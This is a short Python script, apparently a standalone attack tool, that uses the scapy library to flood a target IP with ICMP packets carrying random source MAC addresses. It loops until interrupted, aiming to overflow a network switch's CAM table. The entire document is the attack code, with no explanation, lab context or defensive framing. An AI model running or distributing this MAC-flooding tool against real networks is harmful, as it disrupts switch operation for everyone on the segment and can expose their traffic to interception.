from scapy.all import *
import sys

def cam_table_overflow(dst_ip):
    packet = Ether(src=RandMAC())/IP(dst=dst_ip)/ICMP()
    send(packet, verbose=False)


def main():
    victim_ip = sys.argv[1]

    try:
        print('[*] Sending ICMP packets with random MACs')
        while True:
            cam_table_overflow(victim_ip)
    except KeyboardInterrupt:
        print('[*] Stopping')
        quit()


if __name__ == '__main__':
    main()
